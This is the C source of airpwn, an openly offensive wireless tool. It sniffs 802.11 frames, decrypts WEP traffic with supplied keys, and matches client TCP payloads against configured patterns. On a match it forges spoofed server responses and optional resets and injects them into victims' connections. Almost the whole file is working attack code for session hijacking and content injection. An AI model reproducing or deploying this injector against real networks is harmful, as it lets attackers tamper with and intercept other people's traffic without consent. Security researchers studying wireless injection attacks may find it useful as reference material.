/*
 * Copyright (C) 2004 toast
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA
 * 02111-1307, USA.
 *
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdarg.h>

#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <pthread.h>
#include <time.h>

#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/wireless.h>

#include <getopt.h>

#include <tx80211.h>
#include <tx80211_packet.h>

#define _NET_IF_H // to avoid double-includes
#include <libnet.h>
#include <pcap.h>

#include "conf.h"
#include "802_11.h"
#include "wep.h"

// context for holding program state
struct airpwn_ctx {
  conf_entry *conf_list;
  char *monitor_if;
  char *control_if;
  char *inject_if;
  libnet_ptag_t tcp_t;
  libnet_ptag_t ip_t;
  libnet_t *lnet;
  unsigned int verbosity;
  FILE *logfile;
  wepkey *keys;
  uint16_t iface_mtu;
  uint8_t fcs_present;
  //LORCON structs
  struct tx80211 monitor_tx;
  struct tx80211 control_tx;
  struct tx80211 inject_tx;
  struct tx80211_packet in_packet;
};

typedef struct airpwn_ctx airpwn_ctx;
  
/* 
 * Convenience function which is a wrapper for printf.  Only prints if
 * log_level is less than ctx->verbosity.
 */
void printlog(airpwn_ctx *ctx, int log_level, char *format, ...){
  va_list ap;

  if(ctx->verbosity >= log_level){
    va_start(ap, format);
    vprintf(format, ap);
    va_end(ap);
  }
}

void dumphex(uint8_t *data, uint32_t len){
  uint32_t i;

  printf("| ");
  for(i = 0; i < len; i++){
    if(i && i % 16 == 0)
      printf("|\n| ");
    printf("%02x ", data[i]);
  }
  printf("\n\n");
}

wepkey *parse_wepkey(char *keystr){
  uint8_t keybytes[WEPLARGEKEYSIZE];
  wepkey *key;
  uint32_t len;

  len = strlen(keystr);
  if(len != (WEPLARGEKEYSIZE * 2 + WEPLARGEKEYSIZE - 1) && 
      len != (WEPSMALLKEYSIZE * 2 + WEPSMALLKEYSIZE - 1))
    return NULL;
  
  if(sscanf(keystr,
	"%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:"
	"%02hhx:%02hhx:%02hhx:%02hhx",
	keybytes,
	keybytes+1,
	keybytes+2,
	keybytes+3,
	keybytes+4,
	keybytes+5,
	keybytes+6,
	keybytes+7,
	keybytes+8,
	keybytes+9,
	keybytes+10,
	keybytes+11,
	keybytes+12) == WEPLARGEKEYSIZE){
    key = calloc(1, sizeof(wepkey));
    memcpy(key->key, keybytes, WEPLARGEKEYSIZE);
    key->keylen = WEPLARGEKEYSIZE;
    return key;
  }
  if(sscanf(keystr,
	"%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",
	keybytes,
	keybytes+1,
	keybytes+2,
	keybytes+3,
	keybytes+4) == WEPSMALLKEYSIZE){
    key = calloc(1, sizeof(wepkey));
    memcpy(key->key, keybytes, WEPSMALLKEYSIZE);
    key->keylen = WEPSMALLKEYSIZE;
    return key;
  }
  return NULL;
}

/*
 * Function for printing usage information
 * */
void usage(){

  struct tx80211_cardlist *cardlist = NULL;
  int i;

  printf("usage: airpwn -c <conf file> -d <driver name> [interface options] "
      "[options]\n");
  printf("\t<conf file> : configuration file\n");
  printf("\t<driver name> : supported wireless driver name\n");
  printf("\nInterface options:\n");
  printf("\tYou can use -i to set all 3 interfaces at once, or use the\n");
  printf("\tother options to set each interface individually.\n");
  printf("\t-i <iface> : sets the listen/control/inject interface\n");
  printf("\t-M <iface> : sets the listen (monitor) interface\n");
  printf("\t-C <iface> : sets the control interface\n");
  printf("\t-I <iface> : sets the injection interface\n");
  printf("\nOptional arguments:\n");
  printf("\t-l <logfile> : log verbose data to a file\n");
  printf("\t-f <filter> : bpf filter for libpcap\n");
  printf("\t-F : assume no FCS values from the monitored interface\n");
  printf("\t-m <max> : Specify the maximum data chunk size (MTU - headers)\n");
  printf("\t-k <WEP key>: key to use to de/encrypt WEP packets.  You can\n");
  printf("\t\tuse this option multiple times to specify multiple WEP keys.\n");
  printf("\t-v : increase verbosity (can be used multiple times)\n");
  printf("\t-h : get help (this stuff)\n");
  printf("\n");

  cardlist = tx80211_getcardlist();
  if (cardlist == NULL) {
    fprintf(stderr, "Error accessing supported driver list.\n");
  } else {
    printf("Supported drivers are: ");
    for (i = 1; i < cardlist->num_cards; i++) {
      printf("%s ", cardlist->cardnames[i]);
    }
    printf("\n");
  }
  
}

/*
 * Thread that listens for integers on stdin an interprets them as
 * channels.  If the channel is valid, it will immediately switch to
 * that channel on both interfaces.
 */
void *channel_thread(void *arg){
  airpwn_ctx *ctx = arg;
  unsigned int channel;
  char buff[80];
  
  printlog(ctx, 2, "Channel changing thread starting..\n");
  
  for(;;) {
    if(fgets(buff, sizeof(buff), stdin) && strlen(buff) > 1) {
      channel = atoi(buff);
      /* Accommodate 802.11b or 802.11a channels */
      if( (channel < 14 && channel != 0) || 
          ((channel * 2) > 67 && (channel * 2) < 129)) {
		  
	printlog(ctx, 0, "changing channel to %u\n", channel);
	if (tx80211_setchannel(&ctx->control_tx, channel) != 0) {
	  fprintf(stderr, "Error setting channel to %d\n", channel);
	}
      } else {
	printlog(ctx, 0, "Error: illegal channel specified\n", channel);
      }
    }
  }
}


/*
 * Convenience function to extract the ssid name from a raw 802.11 frame
 * and copy it to the ssid_name argument.  max_name_len is the length of
 * the ssid_name buffer
 */
int get_ssid(const u_char *packet_data, char *ssid_name, u_short max_name_len){
  if(packet_data[36] == 0){ // this is the SSID
    u_short ssid_len = packet_data[37];

    if(ssid_len == 0){
      ssid_name[0] = 0;

      return 0;
    }

    u_short max_len = ssid_len > max_name_len ? max_name_len - 1 : ssid_len;

    memcpy(ssid_name, &packet_data[38], max_len);

    ssid_name[max_len] = 0;

    return 0;
  }

  return -1;
}

/**
 * Function to inject TCP packets to the wireless interface.  Requires headers
 * from a TO_DS packet for use in crafting the FROM_DS response.
 */
void inject_tcp(airpwn_ctx *ctx,
								ieee80211_hdr *w_hdr,
								struct iphdr *ip_hdr,
								struct tcphdr *tcp_hdr,
								uint8_t *wepkey,
								uint32_t keylen,
								char *content,
								uint32_t contentlen,
								uint8_t tcpflags,
								uint32_t *seqnum)
{

  // libnet wants the data in host-byte-order
  u_int ack = ntohl(tcp_hdr->seq) + 
    ( ntohs(ip_hdr->tot_len) - ip_hdr->ihl * 4 - tcp_hdr->doff * 4 );
  
  ctx->tcp_t = libnet_build_tcp(
    ntohs(tcp_hdr->dest), // source port
    ntohs(tcp_hdr->source), // dest port
    *seqnum, // sequence number
    ack, // ack number
    tcpflags, // flags
    0xffff, // window size
    0, // checksum
    0, // urg ptr
    20 + contentlen, // total length of the TCP packet
    (uint8_t*)content, // response
    contentlen, // response_length
    ctx->lnet, // libnet_t pointer
    ctx->tcp_t // ptag
  );

  if(ctx->tcp_t == -1){
    printf("libnet_build_tcp returns error: %s\n", libnet_geterror(ctx->lnet));
    return;
  }

  ctx->ip_t = libnet_build_ipv4(
    40 + contentlen, // length
    0, // TOS bits
    1, // IPID (need to calculate)
    0, // fragmentation
    0xff, // TTL
    6, // protocol
    0, // checksum
    ip_hdr->daddr, // source address
    ip_hdr->saddr, // dest address
    NULL, // response
    0, // response length
    ctx->lnet, // libnet_t pointer
    ctx->ip_t // ptag
  );

  if(ctx->ip_t == -1){
    printf("libnet_build_ipv4 returns error: %s\n", libnet_geterror(ctx->lnet));
    return;
  }

  // copy the libnet packets to to a buffer to send raw..
  
  unsigned char packet_buff[0x10000];

  memcpy(packet_buff, w_hdr, IEEE80211_HDR_LEN);

  ieee80211_hdr *n_w_hdr = (ieee80211_hdr *)packet_buff;

  // set the FROM_DS flag and swap MAC addresses
  n_w_hdr->flags = IEEE80211_FROM_DS;
  if(wepkey)
    n_w_hdr->flags |= IEEE80211_WEP_FLAG;
  n_w_hdr->llc.type = LLC_TYPE_IP;

  uint8_t tmp_addr[6];
  memcpy(tmp_addr, n_w_hdr->addr1, 6);
  memcpy(n_w_hdr->addr1, n_w_hdr->addr2, 6);
  memcpy(n_w_hdr->addr2, tmp_addr, 6);
    
  u_int32_t packet_len;
  u_int8_t *lnet_packet_buf;
  
  // cull_packet will dump the packet (with correct checksums) into a
  // buffer for us to send via the raw socket
  if(libnet_adv_cull_packet(ctx->lnet, &lnet_packet_buf, &packet_len) == -1){
    printf("libnet_adv_cull_packet returns error: %s\n", 
			libnet_geterror(ctx->lnet));
    return;
  }

  memcpy(packet_buff + IEEE80211_HDR_LEN, lnet_packet_buf, packet_len);

  libnet_adv_free_packet(ctx->lnet, lnet_packet_buf);

  // total packet length
  int len = IEEE80211_HDR_LEN + 40 + contentlen;
  
  if(wepkey){
    uint8_t tmpbuf[0x10000];
    /* encryption starts after the 802.11 header, but the LLC header
     * gets encrypted. */
    memcpy(tmpbuf, packet_buff+IEEE80211_HDR_LEN_NO_LLC, 
			len-IEEE80211_HDR_LEN_NO_LLC);
    len = wep_encrypt(tmpbuf, packet_buff+IEEE80211_HDR_LEN_NO_LLC,
			len-IEEE80211_HDR_LEN_NO_LLC, wepkey, keylen);
    if(len <= 0){
      fprintf(stderr, "Error performing WEP encryption!\n");
      return;
    } else
      len += IEEE80211_HDR_LEN_NO_LLC;
  }

  /* Establish lorcon packet transmission structure */
  ctx->in_packet.packet = packet_buff;
  ctx->in_packet.plen = len;

  /* Send the packet */
  if (tx80211_txpacket(&ctx->inject_tx, &ctx->in_packet) < 0) {
    fprintf(stderr, "Unable to transmit packet.");
    perror("tx80211_txpacket");
    return;
  }

  *seqnum += contentlen;  //advance the sequence number
  
  printlog(ctx, 2, "wrote %d bytes to the wire(less)\n", len);
}

/*
 * Function to inject a server-to-client packet in response to a
 * client-to-server packet.  w_hdr, ip_hdr and tcp_hdr are the layer 2,
 * 3 and 4 headers.  conf is a pointer to a conf_entry structure
 * containing the payload to inject. wepkey is the WEP key to encrypt
 * the packet with (if WEP is needed.)  Setting the wepkey to NULL
 * disables encryption. keylen is the length (in bytes) of the wep key.
 */
void spoof_response(airpwn_ctx *ctx,
    conf_entry *conf,
    ieee80211_hdr *w_hdr,
    struct iphdr *ip_hdr, 
    struct tcphdr *tcp_hdr,
    const char *tcpdata,
    uint16_t datalen,
    uint8_t *wepkey,
    uint32_t keylen)
{
  uint32_t seqnum = ntohl(tcp_hdr->ack_seq);
  uint32_t offset;
  char *response_data;
  uint32_t response_data_len;
  
  if(conf->response){
    response_data = conf->response;
    response_data_len = conf->response_len;
  } else if(conf->pyfunc){
    PyObject *args = PyTuple_New(1);
    PyTuple_SetItem(args,0,PyString_FromStringAndSize(tcpdata, datalen));
    PyObject *value = PyObject_CallObject(conf->pyfunc, args);
    
    if(value == NULL){
      printf("Python function returns no data!");
      return;
    }
  
    response_data = PyString_AsString(value);
    response_data_len = strlen(response_data);
  } else {
    printf("No data to inject!\n");
    return;
  }
  
  //printf("injecting: %s\n", response_data);
  
  for(offset = 0; offset < response_data_len; offset += ctx->iface_mtu){
    uint16_t len = response_data_len - offset;
    if(len > ctx->iface_mtu)
      len = ctx->iface_mtu;
      
    printlog(ctx, 4, "packet length: %hu, mtu: %hu, seq: %u\n", 
              len, ctx->iface_mtu, seqnum);
    
    inject_tcp(ctx, w_hdr, ip_hdr, tcp_hdr, wepkey, keylen, 
      response_data + offset, len, 
      TH_PUSH | TH_ACK, &seqnum);
  }

  // follow up the packet with a reset packet if conf tells us to..
  if(conf->options & CONF_OPTION_RESET){
    inject_tcp(ctx, w_hdr, ip_hdr, tcp_hdr, wepkey, keylen, NULL, 0, 
      TH_RST | TH_ACK, &seqnum);
  }
}

void process_ip_packet(airpwn_ctx *ctx, ieee80211_hdr *w_hdr, 
    const uint8_t *data, uint32_t caplen, uint8_t *wepkey, uint32_t keylen){
  int ovector[30];
  time_t timeval;
  struct tm *tmval;
  struct iphdr *ip_hdr = (struct iphdr*)data;

  if(ntohs(ip_hdr->tot_len) > caplen) // goofy IP packet
    return;
  
  if(ip_hdr->protocol != IPPROTO_TCP) // only support TCP for now..
    return;

  struct tcphdr *tcp_hdr = 
    (struct tcphdr*) (data + (ip_hdr->ihl * 4));

  const uint8_t *data_ptr = (uint8_t*)tcp_hdr + tcp_hdr->doff * 4;

  uint16_t datalen = 
    ntohs(ip_hdr->tot_len) - (ip_hdr->ihl * 4) - (tcp_hdr->doff * 4);

  // make sure the packet isn't empty..
  if(datalen <= 0)
    return;

  //printf("%s\n", data_ptr);
  
  conf_entry *conf;

  for(conf = ctx->conf_list; conf != NULL; conf = conf->next){
    if(pcre_exec(conf->match, NULL, (const char*)data_ptr, datalen, 
	  0, 0, ovector, 30) > 0){
      printlog(ctx, 2, "Matched pattern for conf '%s'\n", conf->name);

      if(pcre_exec(conf->ignore, NULL, (const char*)data_ptr, datalen, 0, 0, 
	    ovector, 30) > 0)
      {
	printlog(ctx, 2, "Matched ignore for conf '%s'\n", conf->name);
      } else {
	spoof_response(ctx, conf, w_hdr, ip_hdr, tcp_hdr, data_ptr, datalen, 
                wepkey, keylen);
	timeval = time(NULL);
	tmval = localtime(&timeval);
	if(tmval == NULL){
	  perror("localtime");
	  return;
	}

	printlog(ctx, 1, 
	    "[%d:%02d:%02d] injecting data for conf '%s'\n",
	    tmval->tm_hour, tmval->tm_min, tmval->tm_sec,
	    conf->name);

	// log the data if requested
	if(ctx->logfile){
	  struct in_addr in;
	  char ip1[16], ip2[16], buf[512];

	  in.s_addr = ip_hdr->saddr;
	  memcpy(ip1, inet_ntoa(in), sizeof(ip1));
	  in.s_addr = ip_hdr->daddr;
	  memcpy(ip2, inet_ntoa(in), sizeof(ip2));

	  snprintf(buf, sizeof(buf)-1, 
	      "[%d:%02d:%02d] from: %s to: %s port: %hu\n",
	      tmval->tm_hour, tmval->tm_min, tmval->tm_sec,
	      ip1, ip2, ntohs(tcp_hdr->dest)
	      );
	  write(fileno(ctx->logfile), buf, strlen(buf));
	  write(fileno(ctx->logfile), data_ptr, datalen);
	  write(fileno(ctx->logfile), "\n\n", 2);
	}
      }
    }
  }
}

/*
 * Called by pcap_loop for every packet that passes the (optional) bpf
 * filter
 */
void pckt_callback(u_char *user, const struct pcap_pkthdr *pkthdr, 
    const u_char *packet_data)
{
  ieee80211_hdr w_hdr;
  airpwn_ctx *ctx = (airpwn_ctx *)user;
  char ssid_name[256];
  uint32_t packetlen;

  packetlen = pkthdr->len;

  // code to handle skipping past "prism monitoring header" blocks
  if(*((unsigned int*)packet_data) == htonl(0x44000000)){
    uint32_t len = *((uint32_t*)(packet_data+4));
    packet_data = packet_data + len;
    packetlen -= len;
  }

  // same for radiotap headers, which have a first 16 bits of 0x0000
  if(*((uint16_t*)packet_data) == htons(0x0000)) {
    uint16_t len = *((uint16_t*)(packet_data+2));
    packet_data = packet_data + len;
    packetlen -= len;
  }

  switch(packet_data[0]){
    // data packet
    case 0x08:
      memcpy(&w_hdr, packet_data, sizeof(w_hdr));
      printlog(ctx, 3, "  data packet len: %u, flags: %hhu %s DS\n", 
	  pkthdr->len, w_hdr.flags, 
	  w_hdr.flags & IEEE80211_FROM_DS ? "<--" : "-->");
      
      if(w_hdr.flags & IEEE80211_FROM_DS) // ignore packets from the AP
	break;
      
      if(IS_WEP(w_hdr.flags)){ // the packet is WEP encrypted
	uint8_t cleartext[0x10000];
	int32_t clearlen;
	wepkey *key;
	printlog(ctx, 3, "    WEP encrypted packet found.\n");

	if(!ctx->keys) // no WEP keys so ignore this packet
	  break;
	
	//TODO: some packets may not have a frame check sequence at the
	//end, need to figure this out instead of always subtracting 4
	//bytes.
	for(key = ctx->keys; key != NULL; key = key->next){
	  clearlen = wep_decrypt(packet_data + IEEE80211_HDR_LEN_NO_LLC,
	      cleartext, 
	      packetlen - IEEE80211_HDR_LEN_NO_LLC - (ctx->fcs_present ? IEEE80211_FCS_LEN : 0),
	      key->key, key->keylen);

	  if(clearlen > 0){
	    printlog(ctx, 3, "    WEP decryption succesful.\n");
	    //dumphex(cleartext, clearlen);
	  
	    memcpy(&w_hdr.llc, cleartext, sizeof(LLC_hdr));
	    
	    if(w_hdr.llc.type == LLC_TYPE_IP){
	      process_ip_packet(ctx, &w_hdr, cleartext+LLC_HDR_LEN, 
		  clearlen-LLC_HDR_LEN, key->key, key->keylen);
	    }
	  } else { printlog(ctx, 3, "    WEP decryption failed..\n"); }
	}
      } else if(w_hdr.llc.type == LLC_TYPE_IP)
	process_ip_packet(ctx, &w_hdr, packet_data + IEEE80211_HDR_LEN, 
	    pkthdr->len, NULL, 0);
      break;
    case 0x80:
      get_ssid(packet_data, ssid_name, sizeof(ssid_name));
      printlog(ctx, 4, "  beacon frame (%s)\n", ssid_name);
      break;
    case 0x40:
      get_ssid(packet_data, ssid_name, sizeof(ssid_name));
      printlog(ctx, 4, "  probe request (%s)\n", ssid_name);
      break;
    case 0x50:
      get_ssid(packet_data, ssid_name, sizeof(ssid_name));
      printlog(ctx, 4, "  probe response (%s)\n", ssid_name);
      break;
    case 0xd4:
      printlog(ctx, 4, "  acknowledgement\n");
      break;
    case 0x48:
      printlog(ctx, 4, "  null function\n");
      break;
    case 0xb0:
      printlog(ctx, 4, "  authentication\n");
      break;
    case 0xc0:
      printlog(ctx, 4, "  deauthentication\n");
      break;
    case 0x30:
      printlog(ctx, 4, "  reassociation response\n");
      break;
    case 0xc4:
      printlog(ctx, 4, "  clear to send\n");
      break;
    default:
      printlog(ctx, 5, " ***  unknown type %x\n", packet_data[0]);
  }
}

/*
 * Calls pcap_loop in a loop, listens for packets and processes..
 */
void pcap_monitor(char *interface, airpwn_ctx *ctx, char *filterstr){
  pcap_t *pctx;
  char errbuf[PCAP_ERRBUF_SIZE];
  struct bpf_program prog;

  pctx = pcap_open_live(interface, 0xffff, 1, 1, errbuf);

  if(pctx == NULL){
    printf("Error returned from pcap_open_live: %s\n", errbuf);

    return;
  }

  if(filterstr){
    if(pcap_compile(pctx, &prog, filterstr, 0, 0)){
      printf("Error returned from pcap_compile: %s\n", pcap_geterr(pctx));

      exit(1);
    }

    if(pcap_setfilter(pctx, &prog)){
      printf("Error returned from pcap_setfilter: %s\n",
	  pcap_geterr(pctx));

      exit(1);
    }
  }

  for(;;){
    pcap_loop(pctx, 1, pckt_callback, (u_char*)ctx);
  }
}


int main(int argc, char **argv){
  char *conf_file = NULL;
  char lnet_err[LIBNET_ERRBUF_SIZE];
  char *filterstr=NULL;
  int drivertype=INJ_NODRIVER; /* for lorcon */
  wepkey *tmpkey;
  
  if (argc < 7) { // minimum # of arguments
    usage();
    exit(1);
  }

  airpwn_ctx *ctx = calloc(1, sizeof(airpwn_ctx));
  if(ctx == NULL){
    perror("calloc");
    exit(1);
  }

  // some default ctx values
  ctx->iface_mtu = 1460;
  ctx->fcs_present = 1;

  for(;;){
    int c = getopt(argc, argv, "i:o:c:l:f:vhd:C:M:I:k:m:F");

    if(c < 0)
      break;

    switch(c){
      case 'h':
	     usage();
	     exit(0);
      case 'v':
	     ctx->verbosity++;
	     break;
      case 'i':
				ctx->control_if = optarg;
				ctx->inject_if = optarg;
				ctx->monitor_if = optarg;
				break;
      case 'c':
				conf_file = optarg;
				break;
      case 'f':
				filterstr = optarg;
				break;
      case 'l':
				ctx->logfile = fopen(optarg, "a");
				if(ctx ->logfile == NULL){
				  perror("fopen");
				  exit(1);
				}
      	break;
      case 'd':
        drivertype = tx80211_resolvecard(optarg);
      	break;
      case 'M':
				ctx->monitor_if = optarg;
				break;
      case 'C':
				ctx->control_if = optarg;
				break;
      case 'I':
				ctx->inject_if = optarg;
				break;
      case 'k':
				tmpkey = parse_wepkey(optarg);
				if(tmpkey == NULL){
				  fprintf(stderr, "Error parsing WEP key: %s\n", optarg);
				  exit(1);
				}
				tmpkey->next = ctx->keys;
				ctx->keys = tmpkey;
				break;
		  case 'm':
		    ctx->iface_mtu = (uint16_t)strtol(optarg, NULL, 10);
		    break;
      case 'F':
        ctx->fcs_present = 0;
        break;
      default:
				usage();
				exit(1);
    }
  }

  if(ctx->control_if == NULL || ctx->monitor_if == NULL || 
      ctx->inject_if == NULL || conf_file == NULL){
    usage();
    exit(1);
  }
	
  printlog(ctx, 1, "Parsing configuration file..\n");
  
  ctx->conf_list = parse_config_file(conf_file);
  if(ctx->conf_list == NULL){
    printf("Error parsing configuration file.\n");
    exit(1);
  }

  /* Initialize lorcon here */
  if (drivertype == INJ_NODRIVER) {
    fprintf(stderr, "Driver name not recognized.\n");
    usage();
    return 1;
  }

  printlog(ctx, 1, "Opening command socket..\n");

  /* Initialize lorcon function pointers and other parameters */
  if (tx80211_init(&ctx->control_tx, ctx->control_if, drivertype) < 0) {
    fprintf(stderr, "Error initializing lorcon.\n");
    return 1;
  }

  printlog(ctx, 1, "Opening monitor socket..\n");

  /* Initialize lorcon function pointers and other parameters */
  if (tx80211_init(&ctx->monitor_tx, ctx->monitor_if, drivertype) < 0) {
    fprintf(stderr, "Error initializing lorcon.\n");
    return 1;
  }
  
  printlog(ctx, 1, "Opening injection socket..\n");

  /* Initialize lorcon function pointers and other parameters */
  if (tx80211_init(&ctx->inject_tx, ctx->inject_if, drivertype) < 0) {
    fprintf(stderr, "Error initializing lorcon.\n");
    return 1;
  }
 
  /* Set monitor mode */
  if (tx80211_setmode(&ctx->monitor_tx, IW_MODE_MONITOR) != 0) {
    fprintf(stderr, "Error setting monitor mode for interface %s.\n",
        ctx->monitor_tx.ifname);
    //return 1;
  }

  /* Open the interface to get a socket */
  if (tx80211_open(&ctx->inject_tx) < 0) {
    fprintf(stderr, "Unable to open interface %s.\n", ctx->inject_tx.ifname);
    return 1;
  }

  /* ctx->lnet = libnet_init(LIBNET_LINK_ADV, ctx->in_if, lnet_err); */
  ctx->lnet = libnet_init(LIBNET_LINK_ADV, "lo", lnet_err);
  if(ctx->lnet == NULL){
    printf("Error in libnet_init: %s\n", lnet_err);

    exit(1);
  }

  printlog(ctx, 0, "Listening for packets...\n");
  
  pthread_t thread;
  if(pthread_create(&thread, NULL, channel_thread, ctx)){
    perror("pthread_create");
    exit(1);
  }
  
  pcap_monitor(ctx->monitor_if, ctx, filterstr);

  return 0;
}
